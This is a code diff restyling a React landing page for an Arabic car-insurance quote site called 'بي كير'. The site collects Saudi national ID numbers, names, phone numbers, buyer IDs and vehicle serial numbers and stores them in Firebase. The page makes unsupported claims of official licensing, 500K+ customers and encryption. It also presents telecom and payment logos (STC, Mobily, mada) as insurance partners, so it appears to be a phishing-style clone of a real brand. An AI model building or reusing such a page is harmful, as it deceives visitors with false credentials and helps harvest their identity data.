@@ -11,27 +11,11 @@ import {
 import { addData } from "@/lib/firebase";
 import { useAutoSave } from "@/hooks/use-auto-save";
 import {
-  RefreshCw,
-  Loader2,
-  Car,
-  Stethoscope,
-  ShieldAlert,
-  Plane,
-  ShieldCheck,
-  BadgeCheck,
-  Phone,
-  MessageCircle,
-  ChevronDown,
-  Instagram,
-  Youtube,
-  X,
-  Star,
-  Clock,
-  Building2,
-  Users,
-  HeadphonesIcon,
-  CheckCircle2,
-  ArrowLeft,
+  RefreshCw, Loader2, Car, Stethoscope, ShieldAlert, Plane,
+  ShieldCheck, BadgeCheck, Phone, MessageCircle, ChevronDown,
+  Instagram, Youtube, X, Star, Clock, Building2, Users,
+  HeadphonesIcon, ArrowLeft, CreditCard, Hash, User, Smartphone,
+  CheckCircle2, TrendingUp, Award, Zap,
 } from "lucide-react";
 import { VehicleDropdownOption } from "@/lib/v-types";
 
@@ -93,8 +77,7 @@ export default function Home() {
   });
 
   const fetchVehicles = useCallback(async (nin: string) => {
-    const validation = validateSaudiId(nin);
-    if (!validation.valid) { setVehicleOptions([]); return; }
+    if (!validateSaudiId(nin).valid) { setVehicleOptions([]); return; }
     setIsLoadingVehicles(true);
     setVehicleOptions([]);
     try {
@@ -117,8 +100,6 @@ export default function Home() {
     else { setVehicleOptions([]); setSelectedVehicle(null); }
   }, [identityNumber, fetchVehicles]);
 
-  const refreshCaptcha = () => { setCaptchaCode(generateCaptcha()); setCaptchaInput(""); setCaptchaError(false); };
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const v = validateSaudiId(identityNumber);
@@ -139,157 +120,227 @@ export default function Home() {
     { label: "سفر", icon: Plane },
   ];
 
-  return (
-    <div className="min-h-screen bg-slate-50" dir="rtl">
+  const features = [
+    { icon: Zap, label: "سريع", desc: "احصل على عرضك في 3 دقائق", color: "from-amber-400 to-orange-400" },
+    { icon: ShieldCheck, label: "آمن", desc: "بياناتك محمية ومشفرة", color: "from-emerald-400 to-teal-500" },
+    { icon: Award, label: "موثوق", desc: "مرخص من الجهات الرسمية", color: "from-blue-400 to-indigo-500" },
+    { icon: TrendingUp, label: "أفضل سعر", desc: "نقارن من +25 شركة", color: "from-purple-400 to-pink-500" },
+  ];
 
-      {/* ─── Header ──────────────────────────────────── */}
-      <header className="bg-white border-b border-slate-200 sticky top-0 z-40">
+  return (
+    <div className="min-h-screen bg-[#f5f7fa]" dir="rtl">
+
+      {/* ── Header ─────────────────────────────────────── */}
+      <header className="bg-white/95 backdrop-blur-md border-b border-gray-100 sticky top-0 z-50 shadow-sm">
         <div className="max-w-md mx-auto flex items-center justify-between px-4 py-3">
-          {/* Logo */}
-          <div className="flex items-center gap-2">
-            <div className="w-8 h-8 rounded-lg bg-[#1a5676] flex items-center justify-center">
-              <Car className="w-4 h-4 text-white" />
+          <div className="flex items-center gap-2.5">
+            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-[#1a5676] to-[#0e3a57] flex items-center justify-center shadow-md">
+              <Car className="w-4.5 h-4.5 text-white" />
             </div>
-            <span className="text-base font-black text-[#1a5676] tracking-tight">بي كير</span>
+            <div>
+              <p className="text-sm font-black text-[#0e3a57] leading-none">بي كير</p>
+              <p className="text-[9px] text-slate-400 font-medium leading-none mt-0.5">تأمين السيارات</p>
+            </div>
           </div>
-          {/* Actions */}
           <div className="flex items-center gap-2">
-            <button className="text-xs font-bold text-slate-500 border border-slate-200 rounded-lg px-2.5 py-1.5 hover:bg-slate-50">EN</button>
-            <div className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center">
-              <Users className="w-4 h-4 text-slate-500" />
-            </div>
+            <span className="text-[10px] font-bold bg-emerald-50 text-emerald-600 border border-emerald-200 px-2 py-1 rounded-lg">● مرخص رسمياً</span>
+            <button className="text-xs font-bold text-slate-500 border border-slate-200 rounded-lg px-2.5 py-1.5 hover:bg-slate-50 transition-colors">EN</button>
           </div>
         </div>
       </header>
 
-      {/* ─── Hero ────────────────────────────────────── */}
-      <section className="bg-gradient-to-bl from-[#0e3a57] via-[#1a5676] to-[#1e6b94] text-white">
-        <div className="max-w-md mx-auto px-5 pt-8 pb-6 text-center space-y-3">
-          <span className="inline-flex items-center gap-1.5 bg-white/15 backdrop-blur-sm text-white text-[11px] font-semibold px-3 py-1.5 rounded-full border border-white/20">
-            <CheckCircle2 className="w-3 h-3 text-[#f4ad27]" />
-            منصة مرخصة ومعتمدة رسمياً
-          </span>
-          <h1 className="text-2xl font-black leading-snug">
-            أمّن مركبتك بأفضل
-            <br />
-            <span className="text-[#f4ad27]">عروض التأمين</span>
-            {" "}في السعودية
-          </h1>
-          <p className="text-sm text-white/70 leading-relaxed max-w-xs mx-auto">
-            قارن عروض أكثر من 25 شركة تأمين واحصل على أفضل سعر في أقل من 3 دقائق
-          </p>
-        </div>
+      {/* ── Hero ───────────────────────────────────────── */}
+      <section className="relative overflow-hidden bg-gradient-to-br from-[#062338] via-[#0e3a57] to-[#1a5676]">
+        {/* Decorative blobs */}
+        <div className="absolute top-0 left-0 w-64 h-64 bg-white/5 rounded-full -translate-x-1/2 -translate-y-1/2 blur-3xl" />
+        <div className="absolute bottom-0 right-0 w-80 h-80 bg-[#f4ad27]/10 rounded-full translate-x-1/3 translate-y-1/3 blur-3xl" />
+        <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-blue-400/10 rounded-full blur-2xl" />
 
-        {/* Stat cards — float over section break */}
-        <div className="max-w-md mx-auto px-4 pb-0">
-          <div className="grid grid-cols-3 gap-2 bg-white rounded-t-2xl p-3 shadow-lg">
-            {[
-              { value: "100%", label: "رضى العملاء", icon: Star, color: "text-amber-500 bg-amber-50" },
-              { value: "3", label: "دقائق فقط", icon: Clock, color: "text-blue-600 bg-blue-50" },
-              { value: "+25", label: "شركة تأمين", icon: Building2, color: "text-green-600 bg-green-50" },
-            ].map(({ value, label, icon: Icon, color }) => (
-              <div key={label} className="flex flex-col items-center gap-1 py-1">
-                <div className={`w-7 h-7 rounded-lg flex items-center justify-center ${color}`}>
-                  <Icon className="w-3.5 h-3.5" />
-                </div>
-                <span className="text-lg font-black text-slate-800">{value}</span>
-                <span className="text-[10px] font-semibold text-slate-500 text-center leading-3">{label}</span>
+        {/* Grid pattern overlay */}
+        <div className="absolute inset-0 opacity-5"
+          style={{ backgroundImage: "radial-gradient(circle, #fff 1px, transparent 1px)", backgroundSize: "24px 24px" }} />
+
+        <div className="relative max-w-md mx-auto px-5 pt-10 pb-20 text-center space-y-5">
+          {/* Badge */}
+          <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm border border-white/20 rounded-full px-4 py-2">
+            <span className="w-2 h-2 rounded-full bg-[#f4ad27] animate-pulse" />
+            <span className="text-[11px] font-bold text-white/90">منصة تأمين السيارات رقم 1 في السعودية</span>
+          </div>
+
+          {/* Headline */}
+          <div className="space-y-1">
+            <h1 className="text-3xl font-black text-white leading-tight">
+              أمّن مركبتك
+            </h1>
+            <h1 className="text-3xl font-black leading-tight">
+              <span className="text-[#f4ad27]">بأفضل عرض</span>
+              <span className="text-white"> تأمين</span>
+            </h1>
+          </div>
+
+          <p className="text-sm text-white/60 leading-relaxed max-w-[260px] mx-auto">
+            قارن بين أكثر من 25 شركة تأمين معتمدة واحصل على أفضل سعر فورًا
+          </p>
+
+          {/* Inline stats */}
+          <div className="flex items-center justify-center gap-5 pt-1">
+            {[["500K+", "عميل"], ["+25", "شركة"], ["3د", "فقط"]].map(([v, l]) => (
+              <div key={l} className="text-center">
+                <p className="text-base font-black text-[#f4ad27]">{v}</p>
+                <p className="text-[10px] text-white/50 font-medium">{l}</p>
               </div>
             ))}
           </div>
         </div>
       </section>
 
-      <div className="max-w-md mx-auto px-4 space-y-4 pb-8">
+      {/* ── Form card — overlaps hero ───────────────────── */}
+      <div className="max-w-md mx-auto px-4 -mt-12 relative z-10 pb-6 space-y-4">
 
-        {/* ─── Form card ───────────────────────────────── */}
-        <div className="bg-white rounded-b-2xl rounded-t-none shadow-lg border border-t-0 border-slate-100 overflow-hidden">
+        <div className="bg-white rounded-3xl shadow-2xl shadow-slate-200 overflow-hidden border border-slate-100">
 
-          {/* Product type tabs */}
-          <div className="grid grid-cols-4 bg-slate-50 border-b border-slate-100">
+          {/* Card top strip */}
+          <div className="h-1 bg-gradient-to-l from-[#f4ad27] via-[#1a5676] to-[#f4ad27]" />
+
+          {/* Product tabs */}
+          <div className="flex border-b border-slate-100 bg-slate-50/50">
             {productTabs.map(({ label, icon: Icon }) => (
               <button
                 key={label}
                 type="button"
                 onClick={() => setActiveTab(label)}
-                className={`flex flex-col items-center gap-1 py-3 text-[10px] font-bold transition-all ${
+                className={`flex-1 flex flex-col items-center gap-1.5 py-3 text-[11px] font-bold transition-all ${
                   activeTab === label
-                    ? "bg-white text-[#1a5676] border-b-2 border-[#1a5676] shadow-sm"
-                    : "text-slate-400 hover:text-slate-600"
+                    ? "bg-white text-[#1a5676] shadow-sm border-b-2 border-[#1a5676]"
+                    : "text-slate-400 hover:text-slate-600 hover:bg-white/50"
                 }`}
               >
-                <Icon className="w-3.5 h-3.5" />
+                <Icon className="w-4 h-4" />
                 {label}
               </button>
             ))}
           </div>
 
-          <form onSubmit={handleSubmit} className="p-4 space-y-4">
+          <form onSubmit={handleSubmit} className="p-5 space-y-4">
+            {/* Section label */}
+            <div className="flex items-center gap-2">
+              <div className="flex-1 h-px bg-slate-100" />
+              <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">البيانات الأساسية</span>
+              <div className="flex-1 h-px bg-slate-100" />
+            </div>
 
-            {/* Insurance type */}
-            <div className="flex rounded-xl overflow-hidden border border-slate-200 bg-slate-50 p-1 gap-1">
+            {/* Insurance type pill toggle */}
+            <div className="bg-slate-100 rounded-2xl p-1 flex gap-1">
               {["تأمين جديد", "نقل ملكية"].map((type) => (
-                <button
-                  key={type}
-                  type="button"
-                  onClick={() => setInsuranceType(type)}
-                  className={`flex-1 h-9 rounded-lg text-sm font-bold transition-all ${
+                <button key={type} type="button" onClick={() => setInsuranceType(type)}
+                  className={`flex-1 py-2.5 rounded-xl text-sm font-black transition-all duration-200 ${
                     insuranceType === type
-                      ? "bg-[#1a5676] text-white shadow-sm"
-                      : "text-slate-500 hover:text-[#1a5676]"
-                  }`}
-                >
+                      ? "bg-[#1a5676] text-white shadow-lg shadow-[#1a5676]/30 scale-[1.01]"
+                      : "text-slate-500 hover:text-slate-700"
+                  }`}>
                   {type}
                 </button>
               ))}
             </div>
 
-            {/* Fields */}
-            {[
-              { label: "رقم الهوية / الإقامة", placeholder: "رقم الهوية / الإقامة", value: identityNumber, onChange: (v: string) => { setIdentityNumber(v.replace(/\D/g,"").slice(0,10)); if(identityNumberError) setIdentityNumberError(""); }, type: "tel", error: identityNumberError, loading: isLoadingVehicles },
-              { label: "اسم المالك", placeholder: "الاسم الكامل", value: ownerName, onChange: (v: string) => setOwnerName(v), type: "text" },
-              { label: "رقم الجوال", placeholder: "05xxxxxxxx", value: phoneNumber, onChange: (v: string) => { const c = v.replace(/\D/g,""); setPhoneNumber(c.startsWith("05") ? c.slice(0,10) : c.slice(0,10)); }, type: "tel" },
-            ].map(({ label, placeholder, value, onChange, type, error, loading }) => (
-              <div key={label} className="space-y-1.5">
-                <label className="block text-xs font-semibold text-slate-600">{label}</label>
-                <div className="relative">
-                  <Input
-                    type={type}
-                    inputMode={type === "tel" ? "numeric" : undefined}
-                    placeholder={placeholder}
-                    value={value}
-                    onChange={(e) => onChange(e.target.value)}
-                    className={`h-11 rounded-xl border-2 text-sm text-right transition-colors ${error ? "border-red-400 focus:border-red-500" : "border-slate-200 focus:border-[#1a5676]"}`}
-                    dir="rtl"
-                    required
-                  />
-                  {loading && <Loader2 className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 animate-spin text-[#1a5676]" />}
+            {/* Identity field */}
+            <div className="space-y-1.5">
+              <label className="block text-xs font-bold text-slate-600">رقم الهوية / الإقامة</label>
+              <div className="relative">
+                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1a5676]/10 flex items-center justify-center">
+                  <CreditCard className="w-3.5 h-3.5 text-[#1a5676]" />
                 </div>
-                {error && <p className="text-xs text-red-600 font-medium">{error}</p>}
+                <Input
+                  type="tel" inputMode="numeric"
+                  placeholder="1xxxxxxxxx"
+                  value={identityNumber}
+                  onChange={(e) => { setIdentityNumber(e.target.value.replace(/\D/g,"").slice(0,10)); if(identityNumberError) setIdentityNumberError(""); }}
+                  className={`h-12 rounded-xl border-2 text-sm text-right pr-12 transition-all ${identityNumberError ? "border-red-400 bg-red-50" : "border-slate-200 focus:border-[#1a5676] bg-slate-50 focus:bg-white"}`}
+                  dir="rtl" required
+                />
+                {isLoadingVehicles && <Loader2 className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 animate-spin text-[#1a5676]" />}
+                {identityNumber.length === 10 && !isLoadingVehicles && !identityNumberError && (
+                  <CheckCircle2 className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-emerald-500" />
+                )}
               </div>
-            ))}
+              {identityNumberError && <p className="text-xs text-red-600 font-medium flex items-center gap-1">⚠ {identityNumberError}</p>}
+            </div>
 
-            {/* Transfer-specific fields */}
+            {/* Owner name */}
+            <div className="space-y-1.5">
+              <label className="block text-xs font-bold text-slate-600">اسم المالك</label>
+              <div className="relative">
+                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1a5676]/10 flex items-center justify-center">
+                  <User className="w-3.5 h-3.5 text-[#1a5676]" />
+                </div>
+                <Input
+                  placeholder="الاسم الثلاثي كاملاً"
+                  value={ownerName}
+                  onChange={(e) => setOwnerName(e.target.value)}
+                  className="h-12 rounded-xl border-2 border-slate-200 focus:border-[#1a5676] bg-slate-50 focus:bg-white text-sm text-right pr-12 transition-all"
+                  dir="rtl" required
+                />
+              </div>
+            </div>
+
+            {/* Phone */}
+            <div className="space-y-1.5">
+              <label className="block text-xs font-bold text-slate-600">رقم الجوال</label>
+              <div className="relative">
+                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1a5676]/10 flex items-center justify-center">
+                  <Smartphone className="w-3.5 h-3.5 text-[#1a5676]" />
+                </div>
+                <Input
+                  type="tel" inputMode="numeric"
+                  placeholder="05xxxxxxxx"
+                  value={phoneNumber}
+                  onChange={(e) => { const c = e.target.value.replace(/\D/g,""); setPhoneNumber(c.slice(0,10)); }}
+                  className="h-12 rounded-xl border-2 border-slate-200 focus:border-[#1a5676] bg-slate-50 focus:bg-white text-sm text-right pr-12 transition-all"
+                  dir="rtl" required
+                />
+              </div>
+            </div>
+
+            {/* Transfer fields */}
             {insuranceType === "نقل ملكية" && (
-              <>
-                <div className="space-y-1.5">
-                  <label className="block text-xs font-semibold text-slate-600">اسم المشتري</label>
-                  <Input placeholder="اسم المشتري الكامل" value={buyerName} onChange={(e) => setBuyerName(e.target.value)} className="h-11 rounded-xl border-2 border-slate-200 focus:border-[#1a5676] text-sm text-right" dir="rtl" required />
+              <div className="space-y-3 bg-amber-50 border border-amber-200 rounded-2xl p-3">
+                <p className="text-xs font-bold text-amber-700">بيانات المشتري</p>
+                <div className="relative">
+                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-amber-100 flex items-center justify-center">
+                    <User className="w-3.5 h-3.5 text-amber-600" />
+                  </div>
+                  <Input placeholder="اسم المشتري الكامل" value={buyerName} onChange={(e) => setBuyerName(e.target.value)}
+                    className="h-12 rounded-xl border-2 border-amber-200 focus:border-amber-400 bg-white text-sm text-right pr-12" dir="rtl" required />
                 </div>
-                <div className="space-y-1.5">
-                  <label className="block text-xs font-semibold text-slate-600">رقم هوية المشتري</label>
-                  <Input type="tel" inputMode="numeric" placeholder="رقم هوية المشتري" value={buyerIdNumber} onChange={(e) => setBuyerIdNumber(e.target.value.replace(/\D/g,"").slice(0,10))} className="h-11 rounded-xl border-2 border-slate-200 focus:border-[#1a5676] text-sm text-right" dir="rtl" required />
+                <div className="relative">
+                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-amber-100 flex items-center justify-center">
+                    <CreditCard className="w-3.5 h-3.5 text-amber-600" />
+                  </div>
+                  <Input type="tel" inputMode="numeric" placeholder="رقم هوية المشتري" value={buyerIdNumber}
+                    onChange={(e) => setBuyerIdNumber(e.target.value.replace(/\D/g,"").slice(0,10))}
+                    className="h-12 rounded-xl border-2 border-amber-200 focus:border-amber-400 bg-white text-sm text-right pr-12" dir="rtl" required />
                 </div>
-              </>
+              </div>
             )}
+
+            {/* Divider */}
+            <div className="flex items-center gap-2">
+              <div className="flex-1 h-px bg-slate-100" />
+              <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">بيانات المركبة</span>
+              <div className="flex-1 h-px bg-slate-100" />
+            </div>
 
             {/* Document type */}
             <div className="space-y-1.5">
-              <label className="block text-xs font-semibold text-slate-600">نوع الوثيقة</label>
-              <div className="flex rounded-xl overflow-hidden border border-slate-200 bg-slate-50 p-1 gap-1">
+              <label className="block text-xs font-bold text-slate-600">نوع الوثيقة</label>
+              <div className="grid grid-cols-2 gap-2">
                 {["استمارة", "بطاقة جمركية"].map((t) => (
                   <button key={t} type="button" onClick={() => setDocumentType(t)}
-                    className={`flex-1 h-9 rounded-lg text-xs font-bold transition-all ${documentType === t ? "bg-[#1a5676] text-white shadow-sm" : "text-slate-500 hover:text-[#1a5676]"}`}>
+                    className={`h-11 rounded-xl text-sm font-bold border-2 transition-all ${
+                      documentType === t
+                        ? "border-[#1a5676] bg-[#1a5676] text-white shadow-md shadow-[#1a5676]/20"
+                        : "border-slate-200 text-slate-500 hover:border-[#1a5676]/50 hover:text-[#1a5676]"
+                    }`}>
                     {t}
                   </button>
                 ))}
@@ -298,10 +349,13 @@ export default function Home() {
 
             {/* Serial number */}
             <div className="space-y-1.5">
-              <label className="block text-xs font-semibold text-slate-600">
+              <label className="block text-xs font-bold text-slate-600">
                 {documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"}
               </label>
               <div className="relative">
+                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1a5676]/10 flex items-center justify-center">
+                  <Hash className="w-3.5 h-3.5 text-[#1a5676]" />
+                </div>
                 <Input
                   type="tel" inputMode="numeric"
                   placeholder={documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"}
@@ -309,184 +363,218 @@ export default function Home() {
                   onChange={(e) => { setSerialNumber(e.target.value.replace(/\D/g,"")); setSelectedVehicle(null); }}
                   onFocus={() => { if (vehicleOptions.length > 0) setSerialFieldFocused(true); }}
                   onBlur={() => { setTimeout(() => setSerialFieldFocused(false), 200); }}
-                  className="h-11 rounded-xl border-2 border-slate-200 focus:border-[#1a5676] text-sm text-right"
+                  className="h-12 rounded-xl border-2 border-slate-200 focus:border-[#1a5676] bg-slate-50 focus:bg-white text-sm text-right pr-12 transition-all"
                   dir="rtl" required
                 />
                 {vehicleOptions.length > 0 && !isLoadingVehicles && (
-                  <button type="button" className="absolute left-3 top-1/2 -translate-y-1/2" onClick={() => setSerialFieldFocused(!serialFieldFocused)}>
+                  <button type="button" className="absolute left-3.5 top-1/2 -translate-y-1/2" onClick={() => setSerialFieldFocused(!serialFieldFocused)}>
                     <ChevronDown className={`h-4 w-4 text-[#1a5676] transition-transform ${serialFieldFocused ? "rotate-180" : ""}`} />
                   </button>
                 )}
               </div>
 
               {selectedVehicle && !serialFieldFocused && (
-                <div className="rounded-xl bg-blue-50 border border-blue-100 px-3 py-2" dir="rtl">
-                  <p className="text-[10px] text-blue-500 font-medium">المركبة المختارة</p>
-                  <p className="text-sm font-semibold text-slate-700 mt-0.5">{selectedVehicle.label}</p>
+                <div className="rounded-xl bg-emerald-50 border border-emerald-200 px-3.5 py-2.5">
+                  <p className="text-[10px] text-emerald-600 font-bold mb-0.5">✓ المركبة المختارة</p>
+                  <p className="text-sm font-semibold text-slate-700">{selectedVehicle.label}</p>
                 </div>
               )}
 
               {serialFieldFocused && vehicleOptions.length > 0 && (
-                <div className="absolute z-50 mt-1 w-full max-w-[calc(100%-2rem)] rounded-xl border border-slate-200 bg-white shadow-xl overflow-hidden" dir="rtl">
-                  <div className="max-h-48 overflow-y-auto divide-y divide-slate-50">
+                <div className="absolute z-50 mt-1 w-[calc(100%-2rem)] rounded-2xl border border-slate-200 bg-white shadow-2xl overflow-hidden" dir="rtl">
+                  <div className="max-h-52 overflow-y-auto divide-y divide-slate-50">
                     {vehicleOptions.map((opt) => (
                       <button key={opt.value} type="button"
-                        className={`w-full px-4 py-3 text-right text-sm hover:bg-slate-50 transition-colors ${serialNumber === opt.value ? "bg-blue-50 text-[#1a5676] font-bold" : "text-slate-700"}`}
+                        className={`w-full px-4 py-3 text-right text-sm hover:bg-blue-50 transition-colors flex items-center justify-between ${serialNumber === opt.value ? "bg-blue-50 text-[#1a5676] font-bold" : "text-slate-700"}`}
                         onMouseDown={(e) => { e.preventDefault(); setSerialNumber(opt.value); setSelectedVehicle(opt); setSerialFieldFocused(false); }}>
-                        {opt.label}
+                        <span className="text-xs text-slate-400">{opt.value}</span>
+                        <span>{opt.label}</span>
                       </button>
                     ))}
                   </div>
-                  <button type="button" className="w-full px-4 py-2.5 text-center text-xs text-slate-400 hover:bg-slate-50 border-t border-slate-100"
+                  <button type="button" className="w-full px-4 py-2.5 text-center text-xs text-slate-400 hover:bg-slate-50 border-t border-slate-100 font-medium"
                     onMouseDown={(e) => { e.preventDefault(); setSerialFieldFocused(false); setSerialNumber(""); setSelectedVehicle(null); }}>
-                    إدخال رقم يدوي
+                    إدخال رقم يدوياً
                   </button>
                 </div>
               )}
             </div>
 
             {/* Captcha */}
-            <div className="rounded-xl bg-slate-50 border border-slate-200 p-3 space-y-2">
-              <label className="block text-xs font-semibold text-slate-600">رمز التحقق</label>
+            <div className="rounded-2xl bg-slate-50 border-2 border-dashed border-slate-200 p-3.5 space-y-2.5">
               <div className="flex items-center gap-2">
-                <div className="flex items-center gap-1.5 bg-white rounded-xl border border-slate-200 px-3 py-2" dir="ltr">
+                <span className="text-xs font-bold text-slate-500">رمز التحقق الأمني</span>
+                <div className="flex-1 h-px bg-slate-200" />
+                <button type="button" onClick={() => { setCaptchaCode(generateCaptcha()); setCaptchaInput(""); setCaptchaError(false); }}
+                  className="flex items-center gap-1 text-[10px] font-bold text-[#1a5676] hover:text-[#0e3a57]">
+                  <RefreshCw className="h-3 w-3" /> تحديث
+                </button>
+              </div>
+              <div className="flex items-stretch gap-2">
+                <div className="flex items-center gap-2 bg-white rounded-xl border-2 border-slate-200 px-4 py-2.5 flex-shrink-0" dir="ltr">
                   {captchaCode.split("").map((d, i) => (
-                    <span key={i} className={`text-xl font-black select-none ${i % 2 === 0 ? "text-[#1a5676]" : "text-[#f4ad27]"}`}>{d}</span>
+                    <span key={i} className={`text-2xl font-black select-none font-mono ${i % 2 === 0 ? "text-[#1a5676]" : "text-[#f4ad27]"}`}
+                      style={{ letterSpacing: "0.05em", textDecoration: i === 1 ? "line-through" : "none", transform: `rotate(${(i - 1.5) * 4}deg)`, display: "inline-block" }}>
+                      {d}
+                    </span>
                   ))}
-                  <button type="button" onClick={refreshCaptcha} className="mr-1 p-1.5 bg-[#1a5676] rounded-lg text-white hover:bg-[#154a6d]">
-                    <RefreshCw className="h-3 w-3" />
-                  </button>
                 </div>
                 <Input
                   placeholder="أدخل الرمز"
                   value={captchaInput}
                   onChange={(e) => { setCaptchaInput(e.target.value); if (captchaError) setCaptchaError(false); }}
-                  className={`flex-1 h-11 rounded-xl border-2 text-sm ${captchaError ? "border-red-400" : "border-slate-200 focus:border-[#1a5676]"}`}
-                  dir="rtl" required
+                  className={`flex-1 h-full min-h-[48px] rounded-xl border-2 text-sm text-center font-bold tracking-widest ${captchaError ? "border-red-400 bg-red-50 text-red-700" : "border-slate-200 focus:border-[#1a5676]"}`}
+                  required
                 />
               </div>
-              {captchaError && <p className="text-xs text-red-600 font-medium">رمز التحقق غير صحيح، حاول مرة أخرى</p>}
+              {captchaError && <p className="text-xs text-red-600 font-bold">⚠ الرمز غير صحيح، يرجى المحاولة مجدداً</p>}
             </div>
 
-            {/* Submit */}
-            <Button
+            {/* CTA Button */}
+            <button
               type="submit"
               disabled={submitting}
-              className="h-13 w-full rounded-xl text-sm font-extrabold bg-[#f4ad27] hover:bg-[#e09a18] text-[#1a3d52] shadow-md shadow-amber-100 transition-all"
+              className="w-full h-14 rounded-2xl font-black text-base transition-all duration-200 relative overflow-hidden group disabled:opacity-70"
+              style={{ background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 50%, #f4ad27 100%)", backgroundSize: "200% 100%", color: "#1a3d52", boxShadow: "0 8px 24px rgba(244,173,39,0.4)" }}
             >
               {submitting
-                ? <Loader2 className="h-5 w-5 animate-spin mx-auto" />
-                : <span className="flex items-center justify-center gap-2">احصل على عرضك الآن <ArrowLeft className="h-4 w-4" /></span>
+                ? <Loader2 className="h-6 w-6 animate-spin mx-auto" />
+                : <span className="flex items-center justify-center gap-3">
+                    <span>احصل على عرضك الآن</span>
+                    <div className="w-7 h-7 rounded-xl bg-[#1a3d52]/20 flex items-center justify-center">
+                      <ArrowLeft className="h-4 w-4" />
+                    </div>
+                  </span>
               }
-            </Button>
-            <p className="text-center text-[10px] text-slate-400">🔒 بياناتك مشفرة ومحمية بالكامل</p>
+            </button>
+
+            <div className="flex items-center justify-center gap-4 text-[10px] text-slate-400">
+              <span className="flex items-center gap-1">🔒 بيانات مشفرة</span>
+              <span className="flex items-center gap-1">✅ مجاناً تماماً</span>
+              <span className="flex items-center gap-1">⚡ نتيجة فورية</span>
+            </div>
           </form>
         </div>
 
-        {/* ─── Trust / Why us ─────────────────────────── */}
-        <div className="bg-white rounded-2xl shadow-sm border border-slate-100 p-4">
-          <h2 className="text-sm font-black text-slate-800 text-center mb-3">
-            لماذا يختار أكثر من <span className="text-[#1a5676]">500,000</span> عميل بي كير؟
-          </h2>
-          <div className="grid grid-cols-2 gap-2.5">
-            {[
-              { icon: Star, title: "تقييم 4.9/5", sub: "من آلاف العملاء الراضين", bg: "bg-amber-50 text-amber-500" },
-              { icon: ShieldCheck, title: "أمان وموثوقية", sub: "مرخص من الجهات الرسمية", bg: "bg-blue-50 text-blue-600" },
-              { icon: HeadphonesIcon, title: "دعم 24/7", sub: "فريق متخصص دائماً متاح", bg: "bg-green-50 text-green-600" },
-              { icon: BadgeCheck, title: "أفضل الأسعار", sub: "نقارن لك من +25 شركة", bg: "bg-purple-50 text-purple-600" },
-            ].map(({ icon: Icon, title, sub, bg }) => (
-              <div key={title} className="flex items-start gap-2.5 bg-slate-50 rounded-xl p-3">
-                <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${bg}`}>
-                  <Icon className="w-4 h-4" />
-                </div>
-                <div>
-                  <p className="text-xs font-bold text-slate-800">{title}</p>
-                  <p className="text-[10px] text-slate-500 leading-4 mt-0.5">{sub}</p>
-                </div>
+        {/* ── Feature cards ──────────────────────────────── */}
+        <div className="grid grid-cols-2 gap-3">
+          {features.map(({ icon: Icon, label, desc, color }) => (
+            <div key={label} className="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 space-y-2.5">
+              <div className={`w-10 h-10 rounded-xl bg-gradient-to-br ${color} flex items-center justify-center shadow-md`}>
+                <Icon className="w-5 h-5 text-white" />
               </div>
-            ))}
-          </div>
+              <div>
+                <p className="text-sm font-black text-slate-800">{label}</p>
+                <p className="text-[11px] text-slate-500 leading-4 mt-0.5">{desc}</p>
+              </div>
+            </div>
+          ))}
         </div>
 
-        {/* ─── Company logos ───────────────────────────── */}
+        {/* ── Company logos ──────────────────────────────── */}
         <div className="bg-white rounded-2xl shadow-sm border border-slate-100 p-4">
-          <p className="text-xs font-bold text-slate-500 text-center mb-3">شركات التأمين المعتمدة</p>
+          <p className="text-xs font-bold text-slate-400 text-center mb-3 uppercase tracking-wider">شركاؤنا من شركات التأمين</p>
           <div className="grid grid-cols-4 gap-2">
             {["/stc.png", "/Mobily_Logo.svg", "/mada.svg", "/tan.svg", "/mas.svg", "/sxs.svg", "/rhj.png", "/NIC-logo.png"].map((src, i) => (
-              <div key={i} className="h-10 bg-slate-50 rounded-xl border border-slate-100 flex items-center justify-center p-1.5">
-                <img src={src} alt="" className="max-h-full max-w-full object-contain opacity-70 hover:opacity-100 transition-opacity" onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
+              <div key={i} className="h-11 bg-slate-50 rounded-xl border border-slate-100 flex items-center justify-center p-2 hover:border-[#1a5676]/30 transition-colors">
+                <img src={src} alt="" className="max-h-full max-w-full object-contain opacity-60 hover:opacity-100 transition-opacity"
+                  onError={(e) => { (e.target as HTMLImageElement).parentElement!.style.display = "none"; }} />
               </div>
             ))}
           </div>
         </div>
 
-        {/* ─── Help CTA ────────────────────────────────── */}
-        <div className="rounded-2xl overflow-hidden shadow-sm">
-          <div className="bg-gradient-to-bl from-[#0e3a57] to-[#1a5676] p-5 text-white text-center space-y-3">
-            <p className="text-sm font-bold">هل تحتاج مساعدة؟</p>
-            <p className="text-[11px] text-white/65 leading-relaxed max-w-xs mx-auto">
-              فريق خبرائنا متاح لمساعدتك في اختيار أفضل خطة تأمين تناسبك
-            </p>
-            <div className="grid grid-cols-2 gap-2 pt-1">
-              <a href="tel:920000000" className="flex items-center justify-center gap-2 bg-white/10 hover:bg-white/20 border border-white/20 rounded-xl py-3 text-xs font-bold transition-all">
